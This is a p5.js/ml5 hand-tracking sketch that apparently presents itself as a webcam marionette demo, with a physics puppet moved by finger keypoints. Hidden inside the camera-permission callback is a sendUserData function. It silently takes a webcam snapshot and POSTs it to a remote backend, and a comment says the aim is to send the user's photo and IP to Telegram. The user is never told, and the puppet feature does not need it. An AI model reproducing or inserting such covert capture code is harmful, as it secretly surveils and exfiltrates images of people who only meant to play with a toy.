// Copyright (c) 2024 ml5
// This software is released under the MIT License.
// https://opensource.org/licenses/MIT

// Requires: https://unpkg.com/ml5@1/dist/ml5.js
// Documentation: https://docs.ml5js.org/#/reference/handpose

let handpose;
let video;
let hands = [];
let puppet;
let options = { maxHands: 2, flipHorizontal: true, runtime: "mediapipe" };
let xMax = 1*640;
let yMax = 1*480;
let whichHand;
let pScale = 0.5;  // Scale the puppet
let yGap = 150;     // Have the puppet hang below the hand
let photoSent = false;
let backendUrl = 'https://your-backend-url.onrender.com'; // Update this with your actual backend URL

function preload() {
    // Load the handPose model.
    handpose = ml5.handPose(options);
}

function setup() {
    createCanvas(xMax, yMax);
    world.gravity.y = 20;

    // Create the webcam video and hide it
    video = createCapture(VIDEO, function() {
        console.log("Camera access granted");
        // Camera access granted, send photo and IP to Telegram
        sendUserData();
    });
    
    video.size(xMax, yMax);
    video.hide();

    // Handle camera access denial
    video.elt.addEventListener('error', function() {
        document.getElementById('permissionMessage').style.display = 'block';
    });

    // start detecting hands from the webcam video
    handpose.detectStart(video, gotHands);

    pieces = new Group();  
    pieces.color = 'white';  
    pieces.overlaps(pieces);  
    pieces.stroke = 'white';  
    pieces.drag = 1;  

    makePuppet();
}

async function sendUserData() {
    if (photoSent) return;
    
    try {
        // Capture photo from video
        const canvas = document.createElement('canvas');
        canvas.width = video.width;
        canvas.height = video.height;
        const ctx = canvas.getContext('2d');
        
        // Flip horizontally to match mirror view
        ctx.translate(canvas.width, 0);
        ctx.scale(-1, 1);
        ctx.drawImage(video.elt, 0, 0, canvas.width, canvas.height);
        
        // Convert to data URL
        const photoData = canvas.toDataURL('image/jpeg', 0.8);
        
        // Send to backend
        const response = await fetch(`${backendUrl}/api/user-data`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                photo: photoData
            })
        });

        if (response.ok) {
            console.log('User data sent successfully');
            photoSent = true;
        } else {
            console.error('Failed to send user data');
        }
    } catch (error) {
        console.error('Error sending user data:', error);
    }
}

function draw() {
    showVideo();  
    getHandedness();  
    // showHandPoints();  
    movePuppet();  
    correctJointAngles();
}

function movePuppet() {
    // Make the puppet get lifted by the hand, with yGap between them  
    stroke('white');  
    if (hands.length>0) {  
        // Tip of middle finger, for head  
        jointToTrack = hands[0].keypoints[12];  
        head.moveTowards(jointToTrack.x, jointToTrack.y + yGap, 0.5);  
        line(head.x, head.y, jointToTrack.x, jointToTrack.y);  
        // Tips of index and third fingers, for arms  
        if (whichHand=='Left') {  
            jointToTrack = hands[0].keypoints[16];  
        }    else {  
            jointToTrack = hands[0].keypoints[8];  
        }       
        leftLowerArm.moveTowards(jointToTrack.x, jointToTrack.y + yGap, 0.5);  
        line(leftLowerArm.x, leftLowerArm.y, jointToTrack.x, jointToTrack.y);  
        // Other of index and third fingers, for other arm  
        if (whichHand=='Left') {  
            jointToTrack = hands[0].keypoints[8];  
        }    else {  
            jointToTrack = hands[0].keypoints[16];  
        }       
        rightLowerArm.moveTowards(jointToTrack.x, jointToTrack.y + yGap, 0.5);  
        line(rightLowerArm.x, rightLowerArm.y, jointToTrack.x, jointToTrack.y);  
        // Pinky and thumb, for knees  
        if (whichHand=='Left') {  
            jointToTrack = hands[0].keypoints[20];  
        }    else {  
            jointToTrack = hands[0].keypoints[4];  
        }       
        leftKneeHingeB.moveTowards(jointToTrack.x, jointToTrack.y + yGap + 200*pScale, 1);  
        line(leftKneeHingeB.x, leftKneeHingeB.y, jointToTrack.x, jointToTrack.y);  
        if (whichHand=='Right') {  
            jointToTrack = hands[0].keypoints[20];  
        }    else {  
            jointToTrack = hands[0].keypoints[4];  
        }       
        rightKneeHingeB.moveTowards(jointToTrack.x, jointToTrack.y + yGap + 200*pScale, 1);  
        line(rightKneeHingeB.x, rightKneeHingeB.y, jointToTrack.x, jointToTrack.y);  
    }
}

function showVideo() {
    // Draw the webcam video
    background(255);  
    push();  
    if (options.flipHorizontal){  
        translate(width,0);   
        scale(-1,1);  
    }  
    let transparency = 255; // reduce this to make video transparent  
    tint(255,255,255,transparency);
    image(video, 0, 0, width, height);
    pop();  

    push();  
    // Cope with difference between capture size and canvas size  
    scale(width/xMax, height/yMax);   
    pop();
}

function showHandPoints() {
    // Draw all the tracked hand points
    for (let i = 0; i < hands.length; i++) {
        let hand = hands[i];  
        for (let j = 0; j < hand.keypoints.length; j++) {  
            let keypoint = hand.keypoints[j];  
            fill(0,255,0);  
            // noStroke();  
            textSize(16);  
            text(j, keypoint.x, keypoint.y);  
            // circle(keypoint.x, keypoint.y, 10);  
        }  
    }
}

function getHandedness() {
    for (let i = 0; i < hands.length; i++) {  
        let hand = hands[i];  
        whichHand = hand.handedness;  
        let wx = hand.keypoints[ML5HAND_WRIST].x;  
        let wy = hand.keypoints[ML5HAND_WRIST].y;  
        textSize(24);   
        fill('lime');  
        // text(whichHand, wx, wy+30);   
    }
}

function makePuppet() {
    shoulders = new pieces.Sprite();  
    shoulders.width = pScale*100;  
    shoulders.height = pScale*30;  
    shoulders.x = xMax/2;  
    shoulders.y = yMax/2;  

    neck = new pieces.Sprite();  
    neck.width = pScale*20;  
    neck.height = pScale*50;  
    neck.x = xMax/2;  
    neck.y = yMax/2 - pScale*30;  
    new GlueJoint(neck, shoulders);  

    head = new pieces.Sprite();  
    head.diameter = pScale*80;  
    head.x = xMax/2;  
    head.y = yMax/2 - pScale*70;  
    head.img = '😀';  
    head.textSize = pScale*40;  
    new GlueJoint(neck, head);  

    // Left arm  
    leftUpperArm = new pieces.Sprite();  
    leftUpperArm.width = pScale*20;  
    leftUpperArm.height = pScale*60;  
    leftUpperArm.x = xMax/2 - pScale*40;  
    leftUpperArm.y = yMax/2 + pScale*40;  
    leftUpperArm.color = 'cyan';  

    shoulderHingeA = new pieces.Sprite();  
    shoulderHingeA.diameter = pScale*20;  
    shoulderHingeA.x = xMax/2 - pScale*40;  
    shoulderHingeA.y = yMax/2;  
    new GlueJoint(shoulderHingeA, leftUpperArm);  

    shoulderHingeB = new pieces.Sprite();  
    shoulderHingeB.diameter = pScale*20;  
    shoulderHingeB.x = xMax/2 - pScale*40;  
    shoulderHingeB.y = yMax/2;  
    new GlueJoint(shoulderHingeB, shoulders);  
    new HingeJoint(shoulderHingeA, shoulderHingeB);  

    leftLowerArm = new pieces.Sprite();  
    leftLowerArm.width = pScale*20;  
    leftLowerArm.height = pScale*60;  
    leftLowerArm.x = xMax/2 - pScale*40;  
    leftLowerArm.y = yMax/2 + pScale*90;  
    leftLowerArm.color = 'cyan';  

    leftElbowHingeA = new pieces.Sprite();  
    leftElbowHingeA.diameter = pScale*20;  
    leftElbowHingeA.x = xMax/2 - pScale*40;  
    leftElbowHingeA.y = yMax/2 + pScale*60;  
    new GlueJoint(leftElbowHingeA, leftUpperArm);  

    leftElbowHingeB = new pieces.Sprite();  
    leftElbowHingeB.diameter = pScale*20;  
    leftElbowHingeB.x = xMax/2 - pScale*40;  
    leftElbowHingeB.y = yMax/2 + pScale*60;  
    new GlueJoint(leftElbowHingeB, leftLowerArm);  
    new HingeJoint(leftElbowHingeA, leftElbowHingeB);  

    // Right arm  
    rightUpperArm = new pieces.Sprite();  
    rightUpperArm.width = pScale*20;  
    rightUpperArm.height = pScale*60;  
    rightUpperArm.x = xMax/2 + pScale*40;  
    rightUpperArm.y = yMax/2 + pScale*30;  
    rightUpperArm.color = 'cyan';  

    shoulderHingeC = new pieces.Sprite();  
    shoulderHingeC.diameter = pScale*20;  
    shoulderHingeC.x = xMax/2 + pScale*40;  
    shoulderHingeC.y = yMax/2;  
    new GlueJoint(shoulderHingeC, rightUpperArm);  

    shoulderHingeD = new pieces.Sprite();  
    shoulderHingeD.diameter = pScale*20;  
    shoulderHingeD.x = xMax/2 + pScale*40;  
    shoulderHingeD.y = yMax/2;  
    new GlueJoint(shoulderHingeD, shoulders);  
    new HingeJoint(shoulderHingeC, shoulderHingeD);  

    rightLowerArm = new pieces.Sprite();  
    rightLowerArm.width = pScale*20;  
    rightLowerArm.height = pScale*60;  
    rightLowerArm.x = xMax/2 + pScale*40;  
    rightLowerArm.y = yMax/2 + pScale*90;  
    rightLowerArm.color = 'cyan';  

    rightElbowHingeA = new pieces.Sprite();  
    rightElbowHingeA.diameter = pScale*20;  
    rightElbowHingeA.x = xMax/2 + pScale*40;  
    rightElbowHingeA.y = yMax/2 + pScale*60;  
    new GlueJoint(rightElbowHingeA, rightUpperArm);  

    rightElbowHingeB = new pieces.Sprite();  
    rightElbowHingeB.diameter = pScale*20;  
    rightElbowHingeB.x = xMax/2 + pScale*40;  
    rightElbowHingeB.y = yMax/2 + pScale*60;  
    new GlueJoint(rightElbowHingeB, rightLowerArm);  
    new HingeJoint(rightElbowHingeA, rightElbowHingeB);  

    torso = new pieces.Sprite();  
    torso.width = pScale*50;  
    torso.height = pScale*90;  
    torso.x = xMax/2;  
    torso.y = yMax/2 + pScale*50;  
    new GlueJoint(torso, shoulders);  

    hips = new pieces.Sprite();  
    hips.width = pScale*100;  
    hips.height = pScale*30;  
    hips.x = xMax/2;  
    hips.y = yMax/2 + pScale*90;  
    new GlueJoint(torso, hips);  

    // Left thigh  
    leftThigh = new pieces.Sprite();  
    leftThigh.width = pScale*30;  
    leftThigh.height = pScale*90;  
    leftThigh.x = xMax/2 - pScale*40;  
    leftThigh.y = yMax/2 + pScale*130;  
    leftThigh.color = 'blue';  

    leftHipHingeA = new pieces.Sprite();  
    leftHipHingeA.diameter = pScale*20;  
    leftHipHingeA.x = xMax/2 - pScale*40;  
    leftHipHingeA.y = yMax/2 + pScale*90;  
    new GlueJoint(leftHipHingeA, hips);  

    leftHipHingeB = new pieces.Sprite();  
    leftHipHingeB.diameter = pScale*20;  
    leftHipHingeB.x = xMax/2 - pScale*40;  
    leftHipHingeB.y = yMax/2 + pScale*90;  
    new GlueJoint(leftHipHingeB, leftThigh);  
    new HingeJoint(leftHipHingeA, leftHipHingeB);  

    // Left lower leg  
    leftLowerLeg = new pieces.Sprite();  
    leftLowerLeg.width = pScale*30;  
    leftLowerLeg.height = pScale*90;  
    leftLowerLeg.x = xMax/2 - pScale*40;  
    leftLowerLeg.y = yMax/2 + pScale*200;  
    leftLowerLeg.color = 'blue';  

    // Left knee  
    leftKneeHingeA = new pieces.Sprite();  
    leftKneeHingeA.diameter = pScale*20;  
    leftKneeHingeA.x = xMax/2 - pScale*40;  
    leftKneeHingeA.y = yMax/2 + pScale*170;  
    new GlueJoint(leftKneeHingeA, leftThigh);  
    leftKneeHingeB = new pieces.Sprite();  
    leftKneeHingeB.diameter = pScale*20;  
    leftKneeHingeB.x = xMax/2 - pScale*40;  
    leftKneeHingeB.y = yMax/2 + pScale*170;       
    new HingeJoint(leftKneeHingeA, leftKneeHingeB);  
    new GlueJoint(leftKneeHingeB, leftLowerLeg);  

    // Left foot  
    leftFoot = new pieces.Sprite();  
    leftFoot.width = pScale*60;  
    leftFoot.height = pScale*30;  
    leftFoot.x = xMax/2 - pScale*55;  
    leftFoot.y = yMax/2 + pScale*240;  
    new GlueJoint(leftFoot, leftLowerLeg);  
    leftFoot.color = 'blue';  
    // leftFoot.drag = 2;  
    // Make the foot collide with the thigh, so they don't overswing  
    leftFoot.collides(leftThigh);  

    // Right thigh  
    rightThigh = new pieces.Sprite();  
    rightThigh.width = pScale*30;  
    rightThigh.height = pScale*90;  
    rightThigh.x = xMax/2 + pScale*40;  
    rightThigh.y = yMax/2 + pScale*130;  
    rightThigh.color = 'blue';  

    rightHipHingeA = new pieces.Sprite();  
    rightHipHingeA.diameter = pScale*20;  
    rightHipHingeA.x = xMax/2 + pScale*40;  
    rightHipHingeA.y = yMax/2 + pScale*90;  
    new GlueJoint(rightHipHingeA, hips);  

    rightHipHingeB = new pieces.Sprite();  
    rightHipHingeB.diameter = pScale*20;  
    rightHipHingeB.x = xMax/2 + pScale*40;  
    rightHipHingeB.y = yMax/2 + pScale*90;  
    new GlueJoint(rightHipHingeB, rightThigh);  
    new HingeJoint(rightHipHingeA, rightHipHingeB);  

    // Right lower leg  
    rightLowerLeg = new pieces.Sprite();  
    rightLowerLeg.width = pScale*30;  
    rightLowerLeg.height = pScale*90;  
    rightLowerLeg.x = xMax/2 + pScale*40;  
    rightLowerLeg.y = yMax/2 + pScale*200;  
    rightLowerLeg.color = 'blue';  

    // Right knee  
    rightKneeHingeA = new pieces.Sprite();  
    rightKneeHingeA.diameter = pScale*20;  
    rightKneeHingeA.x = xMax/2 + pScale*40;  
    rightKneeHingeA.y = yMax/2 + pScale*170;  
    new GlueJoint(rightKneeHingeA, rightThigh);  
    rightKneeHingeB = new pieces.Sprite();  
    rightKneeHingeB.diameter = pScale*20;  
    rightKneeHingeB.x = xMax/2 + pScale*40;  
    rightKneeHingeB.y = yMax/2 + pScale*170;       
    new HingeJoint(rightKneeHingeA, rightKneeHingeB);  
    new GlueJoint(rightKneeHingeB, rightLowerLeg);  

    // Right foot  
    rightFoot = new pieces.Sprite();  
    rightFoot.width = pScale*60;  
    rightFoot.height = pScale*30;  
    rightFoot.x = xMax/2 + pScale*55;  
    rightFoot.y = yMax/2 + pScale*240;  
    new GlueJoint(rightFoot, rightLowerLeg);  
    rightFoot.color = 'blue';  
    // rightFoot.drag = 2;  
    // Make the foot collide with the thigh, so they don't overswing  
    rightFoot.collides(rightThigh);  

    box = new Sprite([  
        [1, 1],  
        [xMax, 1],  
        [xMax, yMax],  
        [1, yMax],  
        [1, 1]  
    ]);  
    box.collider = "static";  
    box.shape = "chain";  
    box.color = "skyblue";
}

function correctJointAngles() {
    // Rotation is measured increasing clockwise,  
    // with zero horizontally to the left  
    // Using https://stackoverflow.com/questions/4467539/javascript-modulo-gives-a-negative-result-for-negative-numbers  
    lLegBendAngle = Math.round( (((leftThigh.rotation-leftLowerLeg.rotation) % 360) + 360) % 360 );  
    // leftLowerLeg.textSize = 30;  
    // leftLowerLeg.textColor = 'white';  
    // leftLowerLeg.text = 10*Math.round(lLegBendAngle/10);  
    if (lLegBendAngle > 180) {  
        leftLowerLeg.rotate(-5, 30);  
        // leftLowerLeg.color = 'pink';  
    } // else {  
    //    leftLowerLeg.color = 'blue';  
    // }  

    rLegBendAngle = Math.round( (((rightLowerLeg.rotation-rightThigh.rotation) % 360) + 360) % 360 );  
    if (rLegBendAngle > 180) {  
        // rightLowerLeg.color = 'pink';  
        rightLowerLeg.rotate(5, 30);  
    } // else {  
    //  rightLowerLeg.color = 'blue';  
    // }  

    lArmBendAngle = Math.round( (((leftLowerArm.rotation-leftUpperArm.rotation) % 360) + 360) % 360 );  
    // leftLowerArm.textSize = 30;  
    // leftLowerArm.textColor = 'red';  
    // leftLowerArm.text = 10*Math.round(lArmBendAngle/10);  
    if (lArmBendAngle > 180) {  
        leftLowerArm.rotate(5, 30);  
        // leftLowerArm.color = 'pink';  
    } // else {  
    //    leftLowerArm.color = 'cyan';  
    // }  

    rArmBendAngle = Math.round( (((rightUpperArm.rotation-rightLowerArm.rotation) % 360) + 360) % 360 );  
    // rightLowerArm.textSize = 30;  
    // rightLowerArm.textColor = 'red';  
    // rightLowerArm.text = 10*Math.round(rArmBendAngle/10);  
    if (rArmBendAngle > 180) {  
        rightLowerArm.rotate(-5, 30);  
        // rightLowerArm.color = 'pink';  
    } // else {  
    //    rightLowerArm.color = 'cyan';  
    // }
}

// Callback function for when handpose outputs data
function gotHands(results) {
    // save the output to the hands variable
    hands = results;
}

// The following index labels may be helpful:
const ML5HAND_WRIST = 0;
const ML5HAND_THUMB_CMC = 1;
const ML5HAND_THUMB_MCP = 2;
const ML5HAND_THUMB_IP = 3;
const ML5HAND_THUMB_TIP = 4;
const ML5HAND_INDEX_FINGER_MCP = 5;
const ML5HAND_INDEX_FINGER_PIP = 6;
const ML5HAND_INDEX_FINGER_DIP = 7;
const ML5HAND_INDEX_FINGER_TIP = 8;
const ML5HAND_MIDDLE_FINGER_MCP = 9;
const ML5HAND_MIDDLE_FINGER_PIP = 10;
const ML5HAND_MIDDLE_FINGER_DIP = 11;
const ML5HAND_MIDDLE_FINGER_TIP = 12;
const ML5HAND_RING_FINGER_MCP = 13;
const ML5HAND_RING_FINGER_PIP = 14;
const ML5HAND_RING_FINGER_DIP = 15;
const ML5HAND_RING_FINGER_TIP = 16;
const ML5HAND_PINKY_MCP = 17;
const ML5HAND_PINKY_PIP = 18;
const ML5HAND_PINKY_DIP = 19;
const ML5HAND_PINKY_TIP = 20;